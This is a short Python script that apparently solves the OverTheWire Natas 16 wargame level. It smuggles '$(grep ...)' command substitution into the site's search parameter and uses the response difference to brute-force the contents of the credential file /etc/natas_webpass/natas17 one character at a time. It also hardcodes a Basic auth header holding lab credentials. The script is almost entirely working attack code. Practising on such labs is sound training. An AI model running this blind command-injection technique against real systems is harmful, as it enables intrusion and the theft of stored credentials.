#!/usr/bin/env python3

import string
import requests

CHARSET = string.ascii_letters + string.digits\

def found_pass(resp):
  return """Output:
<pre>
</pre>""" in resp.text

session = requests.Session()
session.headers.update({"Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=="})


def main():
  password = ""
  for _ in range(32):
    for ch in CHARSET:
      temp = password + ch
      print(f"Trying {temp}")
      resp = session.get("http://natas16.natas.labs.overthewire.org/",
                         params={"needle": f"$(grep ^{temp} /etc/natas_webpass/natas17)", "submit":"Search"},
                         timeout=10)
      # print(resp.text)
      if found_pass(resp):
          password = temp
          print(f"[+] Found char: {ch} -> {password}")
          break
      
  print("[.] Recovered Password: ", password)

main()

